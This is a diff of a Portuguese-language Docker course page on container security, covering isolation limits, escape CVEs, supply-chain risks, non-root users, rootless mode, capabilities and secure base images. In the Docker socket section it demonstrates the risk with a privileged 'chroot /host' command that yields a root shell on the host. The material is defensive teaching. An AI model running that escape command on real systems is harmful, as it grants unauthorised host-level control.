@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>CloudTrilhas — Docker Módulo 06: Otimização, Segurança e Boas Práticas</title>
+  <title>CloudTrilhas — Docker Módulo 06: Segurança e Boas Práticas</title>
+  <meta name="description" content="Guia completo sobre segurança em Docker: containers non-root, scan de vulnerabilidades, secrets management, network security, runtime hardening, supply chain security e checklist de produção." />
   <link rel="icon" href="../assets/favicon/favicon.svg" type="image/svg+xml" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -17,22 +18,18 @@
       <a href="../index.html" class="brand"><img src="../assets/logo/cloudtrilhas-logo.svg" alt="CloudTrilhas" /></a>
       <div class="nav-actions">
         <a href="../docker.html" class="nav-link">← Voltar ao Curso</a>
-        <a href="modulo-05.html" class="nav-link">← Anterior</a>
         <a href="modulo-07.html" class="nav-link">Próximo →</a>
-      <button class="nav-toggle" aria-label="Menu" onclick="document.querySelector('.nav-mobile').classList.toggle('active')">☰</button>
+        <a href="../index.html" class="nav-button">Início</a>
+        <button class="nav-toggle" aria-label="Menu" onclick="document.querySelector('.nav-mobile').classList.toggle('active')">☰</button>
       </div>
     </nav>
     <div class="nav-mobile">
       <a href="../index.html">Início</a>
-      <a href="../aws.html">AWS</a>
-      <a href="../linux.html">Linux</a>
       <a href="../docker.html">Docker</a>
+      <a href="../linux.html">Linux</a>
       <a href="../kubernetes.html">Kubernetes</a>
       <a href="../terraform.html">Terraform</a>
       <a href="../python.html">Python</a>
-      <a href="../redes.html">Redes</a>
-      <a href="../github.html">GitHub</a>
-      <a href="../cloudformation.html">CloudFormation</a>
     </div>
   </header>
 
@@ -40,408 +37,1889 @@
     <section class="training-hero">
       <div class="container training-hero-content">
         <span class="pill">🐳 Docker — Módulo 06</span>
-        <h1>Otimização, Segurança e Boas Práticas</h1>
-        <p>Construa imagens menores, mais seguras e eficientes. Domine multi-stage builds, hardening de containers e monitoramento de recursos.</p>
+        <h1>Segurança e Boas Práticas</h1>
+        <p>Domine a segurança em containers Docker: entenda por que containers não são VMs, aprenda a rodar como non-root, escanear vulnerabilidades, gerenciar secrets, proteger redes, aplicar hardening no runtime e garantir a integridade da supply chain das suas imagens.</p>
       </div>
     </section>
 
+    <!-- BARRA DE PROGRESSO -->
+    <section class="module-progress container">
+      <div class="progress-track">
+        <a href="modulo-01.html" class="progress-node"><span>01</span><small>Conceitos</small></a>
+        <a href="modulo-02.html" class="progress-node"><span>02</span><small>Imagens</small></a>
+        <a href="modulo-03.html" class="progress-node"><span>03</span><small>Volumes</small></a>
+        <a href="modulo-04.html" class="progress-node"><span>04</span><small>Redes</small></a>
+        <a href="modulo-05.html" class="progress-node"><span>05</span><small>Compose</small></a>
+        <a href="modulo-06.html" class="progress-node active"><span>06</span><small>Segurança</small></a>
+        <a href="modulo-07.html" class="progress-node"><span>07</span><small>Produção</small></a>
+      </div>
+    </section>
+
+
+    <!-- ============================================================ -->
+    <!-- SEÇÃO 1: POR QUE SEGURANÇA EM DOCKER IMPORTA -->
+    <!-- ============================================================ -->
     <section class="module-section">
       <div class="container">
+        <div class="module-header">
+          <span class="module-badge">Fundamentos</span>
+          <h2>Por que Segurança em Docker Importa</h2>
+          <p>Containers Docker compartilham o kernel do host — eles NÃO são máquinas virtuais e NÃO fornecem isolamento total. Entender isso é o primeiro passo para construir ambientes seguros.</p>
+        </div>
 
-        <!-- Multi-stage Build -->
         <div class="topic-block">
-          <h3>Multi-stage Build</h3>
+          <h3>Containers NÃO São VMs — A Diferença Fundamental</h3>
+          <p>Muitas pessoas tratam containers como se fossem VMs leves e seguras. Essa suposição pode ser perigosa:</p>
           <div class="command-grid">
             <div class="command-card wide">
-              <div class="command-header">
-                <code>Conceito</code>
-                <span class="cmd-tag">otimização</span>
-              </div>
-              <p>Multi-stage build usa múltiplos FROM no mesmo Dockerfile. Cada estágio pode copiar artefatos do anterior, resultando em imagens finais muito menores — sem ferramentas de build, sem código-fonte, apenas o binário/artefato necessário.</p>
-              <pre><code># Benefícios:
-# ✓ Imagem final contém APENAS o necessário para execução
-# ✓ Ferramentas de build ficam no estágio intermediário
-# ✓ Redução drástica de tamanho (ex: Go 1.2GB → 10MB)
-# ✓ Menor superfície de ataque
-# ✓ Um único Dockerfile para build + runtime</code></pre>
-            </div>
-
-            <div class="command-card">
-              <div class="command-header">
-                <code>Node.js Multi-stage</code>
-                <span class="cmd-tag">exemplo</span>
-              </div>
-              <p>Build com dependências de dev, runtime apenas com produção.</p>
-              <pre><code># Estágio 1: Build
-FROM node:20-alpine AS builder
-WORKDIR /app
-COPY package*.json ./
-RUN npm ci
-COPY . .
-RUN npm run build
-
-# Estágio 2: Runtime
-FROM node:20-alpine AS runtime
-WORKDIR /app
-COPY package*.json ./
-RUN npm ci --only=production
-COPY --from=builder /app/dist ./dist
-EXPOSE 3000
-USER node
-CMD ["node", "dist/server.js"]</code></pre>
-            </div>
-
-            <div class="command-card">
-              <div class="command-header">
-                <code>Go com scratch (~10MB)</code>
-                <span class="cmd-tag">exemplo</span>
-              </div>
-              <p>Compilação estática em Go resulta em imagem mínima com scratch.</p>
-              <pre><code># Estágio 1: Compilação
-FROM golang:1.22-alpine AS builder
-WORKDIR /app
-COPY go.mod go.sum ./
-RUN go mod download
-COPY . .
-RUN CGO_ENABLED=0 GOOS=linux \
-    go build -ldflags="-s -w" \
-    -o /app/server ./cmd/main.go
-
-# Estágio 2: Imagem mínima
-FROM scratch
-COPY --from=builder /app/server /server
-COPY --from=builder /etc/ssl/certs/ca-certificates.crt \
-     /etc/ssl/certs/
-EXPOSE 8080
-ENTRYPOINT ["/server"]
-# Resultado: ~10MB!</code></pre>
-            </div>
-
-            <div class="command-card">
-              <div class="command-header">
-                <code>React + Nginx</code>
-                <span class="cmd-tag">exemplo</span>
-              </div>
-              <p>Build do React no Node, serve estático com Nginx.</p>
-              <pre><code># Estágio 1: Build React
-FROM node:20-alpine AS builder
-WORKDIR /app
-COPY package*.json ./
-RUN npm ci
-COPY . .
-RUN npm run build
-
-# Estágio 2: Nginx serve os estáticos
-FROM nginx:alpine
-COPY --from=builder /app/build /usr/share/nginx/html
-COPY nginx.conf /etc/nginx/conf.d/default.conf
-EXPOSE 80
-CMD ["nginx", "-g", "daemon off;"]
-# Resultado: ~25MB</code></pre>
+              <div class="command-header"><code>VM vs Container — Modelo de isolamento</code><span class="cmd-tag">Conceito</span></div>
+              <pre><code># ════════════════════════════════════════════════════════════════
+# MÁQUINA VIRTUAL (VM)
+# ════════════════════════════════════════════════════════════════
+#
+# ┌─────────────────┐  ┌─────────────────┐
+# │   App A         │  │   App B         │
+# │   Libs          │  │   Libs          │
+# │   Kernel Linux  │  │   Kernel Linux  │  ← Kernel PRÓPRIO
+# │   (completo)    │  │   (completo)    │
+# └────────┬────────┘  └────────┬────────┘
+#          │                     │
+# ┌────────┴─────────────────────┴────────┐
+# │         Hypervisor (VMware, KVM)       │
+# ├────────────────────────────────────────┤
+# │         Hardware / Host OS             │
+# └────────────────────────────────────────┘
+#
+# ✅ Isolamento FORTE: kernels separados
+# ✅ Exploits no kernel do guest não afetam host
+# ✅ Modelo de segurança testado há décadas
+#
+# ════════════════════════════════════════════════════════════════
+# CONTAINER DOCKER
+# ════════════════════════════════════════════════════════════════
+#
+# ┌─────────────────┐  ┌─────────────────┐
+# │   App A         │  │   App B         │
+# │   Libs          │  │   Libs          │
+# └────────┬────────┘  └────────┬────────┘
+#          │                     │
+# ┌────────┴─────────────────────┴────────┐
+# │         Kernel Linux (COMPARTILHADO)   │  ← MESMO kernel!
+# ├────────────────────────────────────────┤
+# │         Hardware / Host OS             │
+# └────────────────────────────────────────┘
+#
+# ⚠️ Isolamento via namespaces + cgroups (mais leve)
+# ⚠️ Exploits no kernel podem escapar do container
+# ⚠️ Se o container roda como root, é root NO HOST
+# ⚠️ Syscalls compartilhadas = superfície de ataque maior
+#
+# CONCLUSÃO:
+# Containers são PROCESSOS ISOLADOS, não máquinas isoladas.
+# A segurança depende de COMO você configura o container.</code></pre>
             </div>
           </div>
         </div>
 
-        <!-- Otimização de Cache -->
         <div class="topic-block">
-          <h3>Otimização de Cache e Layers</h3>
+          <h3>Riscos Reais em Docker</h3>
+          <p>Estes são riscos concretos que já causaram brechas em produção:</p>
           <div class="command-grid">
             <div class="command-card">
-              <div class="command-header">
-                <code>Ordem das Layers</code>
-                <span class="cmd-tag">cache</span>
-              </div>
-              <p>A ordem importa! Coloque o que muda menos primeiro para maximizar cache hits.</p>
-              <pre><code># ❌ RUIM — qualquer mudança no código
-# invalida cache do npm install
-COPY . .
-RUN npm install
-
-# ✅ BOM — package.json muda raramente
-# npm install usa cache na maioria dos builds
-COPY package*.json ./
-RUN npm ci
-COPY . .</code></pre>
+              <div class="command-header"><code>Riscos de Container Escape</code><span class="cmd-tag">Risco Alto</span></div>
+              <pre><code># CONTAINER ESCAPE — Sair do container
+# ═══════════════════════════════════════
+#
+# COMO ACONTECE:
+# 1. Container roda como root
+# 2. Exploita vulnerabilidade no kernel
+# 3. Acessa filesystem do host
+# 4. Escala para root no host
+#
+# EXEMPLOS REAIS:
+# • CVE-2019-5736 (runc exploit)
+#   → Sobrescrevia binário do runc no host
+#   → Container root → Host root
+#
+# • CVE-2020-15257 (containerd)
+#   → Acesso ao containerd-shim API
+#   → Escalação de privilégios
+#
+# • CVE-2022-0185 (kernel exploit)
+#   → Bug em file_system_context
+#   → Escape via user namespace
+#
+# IMPACTO:
+# ❌ Acesso total ao host
+# ❌ Acesso a TODOS os outros containers
+# ❌ Acesso a secrets/credenciais do host
+# ❌ Movimentação lateral na rede</code></pre>
             </div>
-
             <div class="command-card">
-              <div class="command-header">
-                <code>Combine RUN + Alpine</code>
-                <span class="cmd-tag">cache</span>
-              </div>
-              <p>Reduza layers combinando comandos e use imagens Alpine.</p>
-              <pre><code># ❌ RUIM — 3 layers, cache de apt desnecessário
-RUN apt-get update
-RUN apt-get install -y curl
-RUN rm -rf /var/lib/apt/lists/*
+              <div class="command-header"><code>Riscos de Imagens e Supply Chain</code><span class="cmd-tag">Risco Médio</span></div>
+              <pre><code># SUPPLY CHAIN ATTACKS
+# ═══════════════════════════════════════
+#
+# IMAGENS MALICIOSAS:
+# • Docker Hub tem imagens com malware
+# • Typosquatting: "ngimx" em vez de "nginx"
+# • Imagens populares com backdoors
+# • Camadas escondidas com cryptominers
+#
+# VULNERABILIDADES CONHECIDAS (CVEs):
+# • Imagem base desatualizada = CVEs
+# • Dependências com falhas conhecidas
+# • Exemplo: log4j em imagens Java
+#
+# SEGREDOS VAZADOS:
+# • API keys hardcoded no Dockerfile
+# • .env copiado para dentro da imagem
+# • Chaves SSH em camadas intermediárias
+# • Tokens em variáveis de ambiente
+#
+# DADOS EXPOSTOS:
+# • Portas expostas desnecessariamente
+# • Debug habilitado em produção
+# • Volumes montados com dados sensíveis
+# • Docker socket exposto ao container
+#
+# RESULTADO:
+# Rodar qualquer imagem sem verificar
+# é como executar código de estranhos
+# com acesso root na sua máquina.</code></pre>
+            </div>
+          </div>
+          <div class="info-box highlight">
+            <strong>🔑 Princípio fundamental:</strong> Segurança em Docker é sobre camadas de defesa (defense in depth). Nenhuma medida isolada é suficiente — combine non-root, scan de CVEs, read-only filesystem, capabilities mínimas e monitoramento.
+          </div>
+        </div>
 
-# ✅ BOM — 1 layer, limpa cache
-RUN apt-get update && \
-    apt-get install -y --no-install-recommends \
-      curl ca-certificates && \
-    rm -rf /var/lib/apt/lists/*
+        <div class="topic-block">
+          <h3>O Docker Socket — O Maior Risco</h3>
+          <p>Montar o Docker socket dentro de um container é equivalente a dar acesso root ao host:</p>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>Docker Socket Exposure — O perigo</code><span class="cmd-tag">Crítico</span></div>
+              <pre><code># O DOCKER SOCKET (/var/run/docker.sock)
+# ════════════════════════════════════════════════════════════════
+#
+# MUITAS ferramentas pedem para montar o socket:
+docker run -v /var/run/docker.sock:/var/run/docker.sock ...
 
-# ✅ MELHOR — use Alpine (5MB base)
+# POR QUE É PERIGOSO:
+# Quem tem acesso ao socket pode:
+# 1. Criar containers privilegiados
+# 2. Montar o filesystem do host
+# 3. Executar comandos como root no host
+# 4. Acessar todos os outros containers
+
+# DEMONSTRAÇÃO DO RISCO:
+# Se um atacante compromete um container com socket montado:
+docker run -it --privileged --pid=host \
+  -v /:/host alpine chroot /host
+# → Agora tem shell ROOT no HOST completo!
+
+# QUANDO É NECESSÁRIO MONTAR O SOCKET:
+# • CI/CD runners (Jenkins, GitLab Runner)
+# • Monitoring (cAdvisor, Portainer)
+# • Reverse proxies automáticos (Traefik)
+#
+# ALTERNATIVAS MAIS SEGURAS:
+# 1. Use TCP com TLS (docker -H tcp://...)
+# 2. Use socket proxy (tecnologia/socat com filtros)
+# 3. Use Podman (rootless, daemonless)
+# 4. Use Docker-in-Docker (dind) com cuidado
+# 5. Limite acesso com --read-only no bind
+
+# REGRA: NUNCA monte o socket sem entender o risco.
+# Se precisar, use o mínimo de permissões possível.</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ============================================================ -->
+    <!-- SEÇÃO 2: NUNCA RODAR COMO ROOT -->
+    <!-- ============================================================ -->
+    <section class="module-section alt-bg">
+      <div class="container">
+        <div class="module-header">
+          <span class="module-badge">Non-Root</span>
+          <h2>Nunca Rodar como Root</h2>
+          <p>Por padrão, containers Docker rodam como root (UID 0). Se um atacante escapar do container, ele será root no host. A primeira e mais importante defesa é sempre rodar como usuário non-root.</p>
+        </div>
+
+        <div class="topic-block">
+          <h3>USER no Dockerfile — A Prática Essencial</h3>
+          <p>A instrução <code>USER</code> define qual usuário executa os comandos dentro do container:</p>
+          <div class="command-grid">
+            <div class="command-card">
+              <div class="command-header"><code>Dockerfile com USER</code><span class="cmd-tag">Recomendado</span></div>
+              <pre><code># ════════════════════════════════════════
+# PADRÃO NON-ROOT PARA NODE.JS
+# ════════════════════════════════════════
 FROM node:20-alpine
-# Alpine usa apk ao invés de apt</code></pre>
-            </div>
 
-            <div class="command-card">
-              <div class="command-header">
-                <code>.dockerignore</code>
-                <span class="cmd-tag">otimização</span>
-              </div>
-              <p>Exclua arquivos desnecessários do build context para builds mais rápidos.</p>
-              <pre><code># .dockerignore
-node_modules
-npm-debug.log
-.git
-.gitignore
-.env
-.env.*
-Dockerfile
-docker-compose*.yml
-.dockerignore
-README.md
-docs/
-tests/
-coverage/
-.vscode/
-*.md</code></pre>
-            </div>
-
-            <div class="command-card">
-              <div class="command-header">
-                <code>Comparação de Tamanhos</code>
-                <span class="cmd-tag">referência</span>
-              </div>
-              <p>Escolha a imagem base adequada para seu caso de uso.</p>
-              <pre><code># Tamanhos aproximados de imagens base:
-# node:20          → ~1.1GB
-# node:20-slim     → ~200MB
-# node:20-alpine   → ~130MB
-# golang:1.22      → ~800MB
-# golang:1.22-alpine → ~250MB
-# scratch          → 0MB (vazio)
-# alpine           → ~5MB
-# ubuntu:24.04     → ~78MB
-# debian:bookworm-slim → ~75MB
-# nginx:alpine     → ~40MB</code></pre>
-            </div>
-          </div>
-        </div>
-
-        <!-- Segurança -->
-        <div class="topic-block">
-          <h3>Segurança de Containers</h3>
-          <div class="command-grid">
-            <div class="command-card">
-              <div class="command-header">
-                <code>Usuário não-root</code>
-                <span class="cmd-tag">segurança</span>
-              </div>
-              <p>Nunca execute containers como root em produção. Crie um usuário dedicado.</p>
-              <pre><code># Criar grupo e usuário sem privilégios
+# Criar grupo e usuário dedicados
 RUN addgroup -S appgroup && \
     adduser -S appuser -G appgroup
 
-# Copiar arquivos com ownership correto
-COPY --chown=appuser:appgroup . /app
+# Diretório da aplicação
+WORKDIR /app
 
-# Mudar para usuário não-root
+# Copiar e instalar deps como root
+COPY package*.json ./
+RUN npm ci --only=production
+
+# Copiar código
+COPY --chown=appuser:appgroup . .
+
+# Mudar para non-root ANTES do CMD
 USER appuser
 
-# Verificar: docker exec container whoami
-# Resultado: appuser (não root!)</code></pre>
+# Porta > 1024 (non-root não pode &lt;1024)
+EXPOSE 3000
+
+CMD ["node", "server.js"]
+
+# ════════════════════════════════════════
+# PADRÃO NON-ROOT PARA PYTHON
+# ════════════════════════════════════════
+FROM python:3.12-slim
+
+RUN groupadd -r appgroup && \
+    useradd -r -g appgroup -d /app \
+    -s /sbin/nologin appuser
+
+WORKDIR /app
+
+COPY requirements.txt .
+RUN pip install --no-cache-dir \
+    -r requirements.txt
+
+COPY --chown=appuser:appgroup . .
+
+USER appuser
+
+EXPOSE 8000
+
+CMD ["gunicorn", "app:app"]</code></pre>
             </div>
-
             <div class="command-card">
-              <div class="command-header">
-                <code>Vulnerability Scanning</code>
-                <span class="cmd-tag">segurança</span>
-              </div>
-              <p>Escaneie imagens para vulnerabilidades conhecidas antes de deploy.</p>
-              <pre><code># Docker Scout (integrado ao Docker Desktop)
-docker scout cves minha-imagem:latest
-docker scout recommendations minha-imagem:latest
+              <div class="command-header"><code>Verificar e forçar non-root</code><span class="cmd-tag">Runtime</span></div>
+              <pre><code># VERIFICAR QUEM ESTÁ RODANDO:
+docker exec meu-container whoami
+# appuser ← OK!
+# root    ← PROBLEMA!
 
-# Trivy (open source, CI/CD friendly)
-trivy image minha-imagem:latest
-trivy image --severity HIGH,CRITICAL app:v1
-trivy image --exit-code 1 app:v1  # Falha no CI
+docker exec meu-container id
+# uid=1000(appuser) gid=1000(appgroup)
 
-# Snyk
-docker scan minha-imagem:latest</code></pre>
-            </div>
+# VER O USER DA IMAGEM:
+docker inspect nginx:alpine \
+  --format '{{.Config.User}}'
+# (vazio = root!)
 
-            <div class="command-card">
-              <div class="command-header">
-                <code>Boas Práticas de Segurança</code>
-                <span class="cmd-tag">segurança</span>
-              </div>
-              <p>Checklist de segurança para imagens e containers em produção.</p>
-              <pre><code># ✓ Use tags específicas (NUNCA :latest)
-FROM node:20.11.0-alpine
+# FORÇAR NON-ROOT NO docker run:
+docker run --user 1000:1000 nginx:alpine
 
-# ✓ Não coloque secrets na imagem
-# Use env vars ou secrets manager
+# FORÇAR NON-ROOT NO COMPOSE:
+services:
+  app:
+    image: minha-app
+    user: "1000:1000"
 
-# ✓ Filesystem read-only
-docker run --read-only app:v1
+# IMPEDIR ESCALAÇÃO PARA ROOT:
+docker run --security-opt=no-new-privileges \
+  minha-app
 
-# ✓ Drop ALL capabilities
-docker run --cap-drop ALL app:v1
+# NO COMPOSE:
+services:
+  app:
+    security_opt:
+      - no-new-privileges:true
 
-# ✓ Nunca monte o Docker socket
-# ❌ -v /var/run/docker.sock:/var/run/docker.sock
+# VERIFICAR SE IMAGEM PODE RODAR NON-ROOT:
+# Muitas imagens oficiais JÁ suportam:
+# • node → USER node (UID 1000)
+# • nginx → Precisa ajustar porta
+# • postgres → Roda como postgres
+# • redis → Roda como redis
 
-# ✓ Docker Content Trust (assinatura)
-export DOCKER_CONTENT_TRUST=1
-docker pull nginx  # Verifica assinatura</code></pre>
-            </div>
-
-            <div class="command-card">
-              <div class="command-header">
-                <code>Runtime Hardening</code>
-                <span class="cmd-tag">segurança</span>
-              </div>
-              <p>Restrições adicionais ao executar containers.</p>
-              <pre><code># Combinação completa de segurança
-docker run -d \
-  --name app-secure \
-  --read-only \
-  --cap-drop ALL \
-  --cap-add NET_BIND_SERVICE \
-  --security-opt no-new-privileges \
-  --tmpfs /tmp:rw,noexec,nosuid \
-  --memory 256m \
-  --cpus 0.5 \
-  --pids-limit 100 \
-  --user 1000:1000 \
-  app:v1</code></pre>
+# DICA: Use portas > 1024 para non-root
+# (portas 1-1023 requerem root ou
+#  CAP_NET_BIND_SERVICE)</code></pre>
             </div>
           </div>
         </div>
 
-        <!-- Monitoramento e Debug -->
         <div class="topic-block">
-          <h3>Monitoramento e Debug</h3>
+          <h3>Rootless Mode — Docker Sem Root</h3>
+          <p>Além de rodar containers como non-root, você pode rodar o próprio daemon Docker sem root:</p>
           <div class="command-grid">
-            <div class="command-card">
-              <div class="command-header">
-                <code>docker stats</code>
-                <span class="cmd-tag">monitorar</span>
-              </div>
-              <p>Monitore CPU, memória, rede e I/O em tempo real.</p>
-              <pre><code># Tempo real (atualiza a cada segundo)
-docker stats
-
-# Snapshot único (para scripts)
-docker stats --no-stream
-
-# Container específico
-docker stats meu-app
-
-# Formato customizado
-docker stats --format \
-  "table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}"</code></pre>
-            </div>
-
-            <div class="command-card">
-              <div class="command-header">
-                <code>docker system df</code>
-                <span class="cmd-tag">disco</span>
-              </div>
-              <p>Verifique uso de disco por tipo de objeto Docker.</p>
-              <pre><code># Resumo de uso de disco
-docker system df
-
-# Detalhado por objeto
-docker system df -v
-
-# Saída exemplo:
-# TYPE          TOTAL   ACTIVE  SIZE    RECLAIMABLE
-# Images        15      5       4.2GB   2.8GB (66%)
-# Containers    8       3       120MB   85MB (70%)
-# Volumes       12      4       1.5GB   900MB (60%)
-# Build Cache   -       -       2.1GB   2.1GB</code></pre>
-            </div>
-
-            <div class="command-card">
-              <div class="command-header">
-                <code>docker system prune</code>
-                <span class="cmd-tag danger">limpeza</span>
-              </div>
-              <p>Limpe recursos não utilizados para liberar espaço.</p>
-              <pre><code># Limpar containers parados + imagens dangling
-docker system prune
-
-# Limpar TUDO não utilizado (cuidado!)
-docker system prune -a
-
-# Incluir volumes (dados persistentes!)
-docker system prune -a --volumes
-
-# Sem confirmação (scripts)
-docker system prune -af</code></pre>
-            </div>
-
-            <div class="command-card">
-              <div class="command-header">
-                <code>docker events / top / diff</code>
-                <span class="cmd-tag">debug</span>
-              </div>
-              <p>Ferramentas avançadas de debug e inspeção.</p>
-              <pre><code># Eventos em tempo real do daemon
-docker events
-docker events --filter type=container
-
-# Processos dentro do container
-docker top meu-app
-docker top meu-app aux
-
-# Mudanças no filesystem do container
-docker diff meu-app
-# A = adicionado, C = modificado, D = deletado
-
-# Salvar estado atual como nova imagem
-docker commit meu-app debug-snapshot:v1
-
-# Exportar filesystem como tar
-docker export meu-app > app-fs.tar</code></pre>
-            </div>
-
             <div class="command-card wide">
-              <div class="command-header">
-                <code>Resource Limits</code>
-                <span class="cmd-tag">recursos</span>
-              </div>
-              <p>Limite recursos para evitar que um container consuma toda a máquina.</p>
-              <pre><code># Limite de memória (container é killed se exceder)
-docker run --memory 512m --memory-swap 1g app:v1
+              <div class="command-header"><code>Docker Rootless Mode</code><span class="cmd-tag">Avançado</span></div>
+              <pre><code># DOCKER ROOTLESS MODE
+# ════════════════════════════════════════════════════════════════
+#
+# O QUE É:
+# O daemon dockerd roda como usuário comum (não root).
+# Mesmo que um container escape, NÃO será root no host.
+#
+# INSTALAR:
+# Pré-requisitos:
+sudo apt-get install -y uidmap dbus-user-session
 
-# Limite de CPU
-docker run --cpus 1.5 app:v1          # 1.5 cores
-docker run --cpu-shares 512 app:v1     # Peso relativo
+# Instalar rootless:
+dockerd-rootless-setuptool.sh install
 
-# Limite de I/O de disco
-docker run --device-read-bps /dev/sda:10mb app:v1
-docker run --device-write-bps /dev/sda:5mb app:v1
+# CONFIGURAR:
+# Adicionar ao ~/.bashrc:
+export PATH=/home/$USER/bin:$PATH
+export DOCKER_HOST=unix:///run/user/$(id -u)/docker.sock
 
-# Verificar limites aplicados
-docker inspect --format '{{.HostConfig.Memory}}' meu-app
-docker stats --no-stream meu-app</code></pre>
+# VERIFICAR:
+docker info | grep -i "root"
+# rootless: true  ← Sucesso!
+
+# LIMITAÇÕES DO ROOTLESS MODE:
+# ⚠️ Não suporta --privileged (bom! mais seguro)
+# ⚠️ Networking limitado (usa slirp4netns ou pasta)
+# ⚠️ Cgroup v2 necessário para resource limits
+# ⚠️ Algumas storage drivers não funcionam
+# ⚠️ Portas < 1024 não disponíveis por padrão
+#
+# QUANDO USAR:
+# ✅ Ambientes de CI/CD
+# ✅ Desenvolvimento local seguro
+# ✅ Hosts multi-tenant
+# ✅ Quando não precisa de --privileged
+#
+# ALTERNATIVA: Podman (rootless por padrão, daemonless)</code></pre>
             </div>
           </div>
         </div>
 
+        <div class="topic-block">
+          <h3>Linux Capabilities — Permissões Granulares</h3>
+          <p>Em vez de dar ALL ou NOTHING, Linux capabilities permitem controle granular sobre o que o container pode fazer:</p>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>Capabilities — Drop e Add</code><span class="cmd-tag">Hardening</span></div>
+              <pre><code># LINUX CAPABILITIES
+# ════════════════════════════════════════════════════════════════
+#
+# O QUE SÃO:
+# Root tradicional = TODAS as permissões
+# Capabilities = permissões divididas em ~40 categorias
+#
+# CAPABILITIES PADRÃO DO DOCKER:
+# Container root recebe estas capabilities por padrão:
+# CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_FSETID, CAP_FOWNER,
+# CAP_MKNOD, CAP_NET_RAW, CAP_SETGID, CAP_SETUID,
+# CAP_SETFCAP, CAP_SETPCAP, CAP_NET_BIND_SERVICE,
+# CAP_SYS_CHROOT, CAP_KILL, CAP_AUDIT_WRITE
+
+# MELHORES PRÁTICAS — DROP ALL, ADD ESPECÍFICAS:
+docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE nginx
+
+# NO COMPOSE:
+services:
+  web:
+    image: nginx:alpine
+    cap_drop:
+      - ALL
+    cap_add:
+      - NET_BIND_SERVICE    # Bind em portas < 1024
+      - CHOWN               # Se precisar mudar ownership
+
+# CAPABILITIES PERIGOSAS (NUNCA adicionar sem necessidade):
+# ─────────────────────────────────────────────────────────
+# CAP_SYS_ADMIN     → Quase equivalente a root completo
+# CAP_NET_ADMIN     → Manipular rede do host
+# CAP_SYS_PTRACE    → Debug de qualquer processo
+# CAP_SYS_MODULE    → Carregar módulos no kernel
+# CAP_DAC_READ_SEARCH → Ler qualquer arquivo
+
+# VER CAPABILITIES DE UM CONTAINER:
+docker inspect --format='{{.HostConfig.CapAdd}}' container
+docker inspect --format='{{.HostConfig.CapDrop}}' container
+
+# DENTRO DO CONTAINER:
+cat /proc/1/status | grep -i cap
+# CapPrm: 00000000a80425fb (bitmap de capabilities)</code></pre>
+            </div>
+          </div>
+          <div class="info-box">
+            <strong>💡 Regra de ouro:</strong> Sempre use <code>--cap-drop=ALL</code> e adicione SOMENTE as capabilities específicas que seu container precisa. Se não sabe quais precisa, rode sem <code>--cap-drop</code> primeiro, depois remova uma por uma até encontrar o mínimo necessário.
+          </div>
+        </div>
       </div>
     </section>
 
+
+    <!-- ============================================================ -->
+    <!-- SEÇÃO 3: IMAGENS SEGURAS -->
+    <!-- ============================================================ -->
+    <section class="module-section">
+      <div class="container">
+        <div class="module-header">
+          <span class="module-badge">Imagens</span>
+          <h2>Imagens Seguras</h2>
+          <p>A segurança começa na escolha e construção da imagem. Uma imagem com vulnerabilidades conhecidas é uma porta aberta para atacantes. Aprenda a escolher, escanear e construir imagens seguras.</p>
+        </div>
+
+        <div class="topic-block">
+          <h3>Escolhendo Imagens Base Seguras</h3>
+          <p>A escolha da imagem base determina a superfície de ataque do seu container:</p>
+          <div class="command-grid">
+            <div class="command-card">
+              <div class="command-header"><code>Hierarquia de segurança das bases</code><span class="cmd-tag">Escolha</span></div>
+              <pre><code># RANKING DE SEGURANÇA (mais → menos segura)
+# ════════════════════════════════════════════
+#
+# 1. 🏆 SCRATCH (zero dependências)
+FROM scratch
+# • 0 pacotes, 0 CVEs possíveis
+# • Apenas para binários estáticos
+# • Ideal: Go, Rust compilados
+# • Sem shell, sem debug
+#
+# 2. 🥈 DISTROLESS (Google)
+FROM gcr.io/distroless/base-debian12
+# • Sem shell, sem package manager
+# • Apenas runtime necessário
+# • ~2-20MB
+# • Ideal: Java, Python, Node
+#
+# 3. 🥉 ALPINE (minimal Linux)
+FROM alpine:3.20
+# • musl libc + busybox (~5MB)
+# • Package manager: apk
+# • Poucos pacotes = poucos CVEs
+# • Ideal: quando precisa de shell
+#
+# 4. SLIM (Debian minimizado)
+FROM python:3.12-slim
+# • Debian sem extras (~80-150MB)
+# • Bom equilíbrio tamanho/compat
+#
+# 5. ⚠️ FULL (NÃO usar em produção)
+FROM ubuntu:24.04
+# • Centenas de pacotes instalados
+# • Superfície de ataque enorme
+# • Apenas para dev/debug</code></pre>
+            </div>
+            <div class="command-card">
+              <div class="command-header"><code>Exemplos práticos de bases seguras</code><span class="cmd-tag">Exemplos</span></div>
+              <pre><code># GO — SCRATCH (mais seguro possível)
+# ════════════════════════════════════
+FROM golang:1.22-alpine AS builder
+WORKDIR /app
+COPY . .
+RUN CGO_ENABLED=0 go build -o /server
+
+FROM scratch
+COPY --from=builder /server /server
+COPY --from=builder /etc/ssl/certs \
+     /etc/ssl/certs
+USER 65534:65534
+ENTRYPOINT ["/server"]
+# Resultado: ~10-15MB, 0 CVEs
+
+# NODE.JS — DISTROLESS
+# ════════════════════════════════════
+FROM node:20-alpine AS builder
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci --only=production
+COPY . .
+
+FROM gcr.io/distroless/nodejs20-debian12
+WORKDIR /app
+COPY --from=builder /app .
+USER nonroot:nonroot
+CMD ["server.js"]
+# Resultado: ~120MB, mínimo de CVEs
+
+# PYTHON — SLIM + VENV
+# ════════════════════════════════════
+FROM python:3.12-slim AS builder
+WORKDIR /app
+RUN python -m venv /opt/venv
+ENV PATH="/opt/venv/bin:$PATH"
+COPY requirements.txt .
+RUN pip install --no-cache-dir \
+    -r requirements.txt
+
+FROM python:3.12-slim
+COPY --from=builder /opt/venv /opt/venv
+ENV PATH="/opt/venv/bin:$PATH"
+WORKDIR /app
+COPY . .
+USER nobody:nogroup
+CMD ["python", "app.py"]</code></pre>
+            </div>
